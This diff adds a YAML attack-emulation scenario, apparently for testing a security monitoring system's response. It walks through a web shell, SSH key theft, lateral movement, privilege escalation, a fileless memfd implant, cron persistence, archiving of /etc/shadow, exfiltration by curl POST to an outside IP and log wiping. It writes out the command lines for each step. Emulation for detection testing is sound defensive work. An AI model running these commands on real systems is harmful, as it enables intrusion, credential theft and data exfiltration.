@@ -1,0 +1,49 @@
+name: apt_lateral_movement
+title: "APT: web shell -> credential theft -> SSH lateral movement -> root -> fileless implant -> exfil"
+description: >
+  Caldera-style adversary emulation. An attacker exploits the PHP application on web-01,
+  steals the deploy SSH key, pivots to the internal API server app-01, escalates to root with a
+  local exploit, loads a fileless implant from memory, injects into the API process, persists
+  with cron and exfiltrates data. With autonomous response ON the SOC should stop the attack at
+  the lateral-movement step; with response OFF (monitor) the full kill chain plays out.
+steps:
+  # ---------------- web-01: initial access via web shell
+  - {id: shell, name: "Web shell spawns /bin/sh", host: web-01, action: exec, parent: "@php-fpm",
+     binary: /bin/sh, args: "-c whoami;id;uname -a", uid: 33, technique: T1505.003, delay: 2}
+  - {name: "whoami", host: web-01, action: exec, parent: shell, binary: /usr/bin/whoami, exit: true, technique: T1033, delay: 0.8}
+  - {name: "id", host: web-01, action: exec, parent: shell, binary: /usr/bin/id, exit: true, technique: T1033, delay: 0.4}
+  - {name: "uname -a", host: web-01, action: exec, parent: shell, binary: /usr/bin/uname, args: "-a", exit: true, technique: T1082, delay: 0.4}
+  - {name: "cat /etc/passwd", host: web-01, action: exec, parent: shell, binary: /usr/bin/cat, args: "/etc/passwd", exit: true, technique: T1087.001, delay: 1}
+  - {id: dl, name: "Download stager to /tmp", host: web-01, action: exec, parent: shell, binary: /usr/bin/curl,
+     args: "-fsSL http://203.0.113.66/x/agent.sh -o /tmp/.agent.sh", technique: T1105, delay: 1.5}
+  - {name: "Stager C2 connection", host: web-01, action: connect, proc: dl, dst_ip: 203.0.113.66, dport: 80, delay: 0.3}
+  - {id: stage, name: "Run stager", host: web-01, action: exec, parent: shell, binary: /bin/bash, args: "/tmp/.agent.sh", technique: T1059.004, delay: 1}
+  - {id: catkey, name: "Steal deploy SSH key", host: web-01, action: exec, parent: stage, binary: /usr/bin/cat, args: "/var/www/.ssh/id_rsa", delay: 1.5}
+  - {name: "Read private key (kernel file hook)", host: web-01, action: file, proc: catkey, path: /var/www/.ssh/id_rsa, technique: T1552.004, delay: 0.2}
+  - {id: sshc, name: "ssh deploy@app-01", host: web-01, action: exec, parent: stage, binary: /usr/bin/ssh,
+     args: "-i /var/www/.ssh/id_rsa -o StrictHostKeyChecking=no deploy@10.0.2.21", uid: 33, delay: 1.5}
+  # ---------------- lateral movement
+  - {id: remote, name: "SSH pivot web-01 -> app-01", host: web-01, action: ssh_pivot, proc: sshc, dst_host: app-01,
+     uid: 1002, cwd: /home/deploy, technique: T1021.004, delay: 0.5}
+  # ---------------- app-01: post-exploitation
+  - {name: "hostname", host: app-01, action: exec, parent: remote, binary: /usr/bin/hostname, exit: true, technique: T1082, delay: 1.5}
+  - {id: dl2, name: "Download exploit", host: app-01, action: exec, parent: remote, binary: /usr/bin/curl,
+     args: "-fsSL http://203.0.113.66/x/pwn -o /tmp/.x/pwnkit", technique: T1105, delay: 1}
+  - {name: "Exploit download connection", host: app-01, action: connect, proc: dl2, dst_ip: 203.0.113.66, dport: 80, delay: 0.3}
+  - {id: exploit, name: "Run local privilege-escalation exploit", host: app-01, action: exec, parent: remote,
+     binary: /tmp/.x/pwnkit, args: "", uid: 1002, delay: 1}
+  - {name: "Kernel creds -> uid 0", host: app-01, action: privesc, proc: exploit, technique: T1068, delay: 0.3}
+  - {id: rootsh, name: "Root shell", host: app-01, action: exec, parent: exploit, binary: /bin/sh, args: "-p", uid: 0, delay: 0.5}
+  - {id: py, name: "Python memfd loader", host: app-01, action: exec, parent: rootsh, binary: /usr/bin/python3,
+     args: "-c import os,urllib.request as u;fd=os.memfd_create('kworker');os.write(fd,u.urlopen('http://203.0.113.66/i').read())", uid: 0, delay: 1}
+  - {name: "memfd_create('kworker')", host: app-01, action: memfd, proc: py, name: kworker, technique: T1620, delay: 0.3}
+  - {id: implant, name: "Execute implant from memory", host: app-01, action: exec, parent: py, binary: /proc/self/fd/3, args: "--daemon", uid: 0, technique: T1620, delay: 0.3}
+  - {name: "Inject into gunicorn via ptrace", host: app-01, action: ptrace, proc: implant, target: "@gunicorn", technique: T1055.008, delay: 1}
+  - {name: "Cron persistence", host: app-01, action: exec, parent: rootsh, binary: /usr/bin/crontab, args: "/tmp/.x/cron", uid: 0, exit: true, technique: T1053.003, delay: 1}
+  - {id: tar, name: "Archive secrets", host: app-01, action: exec, parent: rootsh, binary: /usr/bin/tar,
+     args: "czf /tmp/.x/loot.tgz /srv/api/config /etc/shadow", uid: 0, technique: T1560.001, delay: 1}
+  - {name: "Read /etc/shadow", host: app-01, action: file, proc: tar, path: /etc/shadow, technique: T1003.008, delay: 0.2}
+  - {id: ex, name: "Exfiltrate over HTTPS", host: app-01, action: exec, parent: rootsh, binary: /usr/bin/curl,
+     args: "-s -X POST --data-binary @/tmp/.x/loot.tgz https://203.0.113.66/upload", uid: 0, technique: T1048, delay: 1}
+  - {name: "Exfil connection", host: app-01, action: connect, proc: ex, dst_ip: 203.0.113.66, dport: 443, delay: 0.3}
+  - {name: "Wipe auth log", host: app-01, action: exec, parent: rootsh, binary: /usr/bin/shred, args: "-u /var/log/auth.log", uid: 0, exit: true, technique: T1070.002, delay: 1}
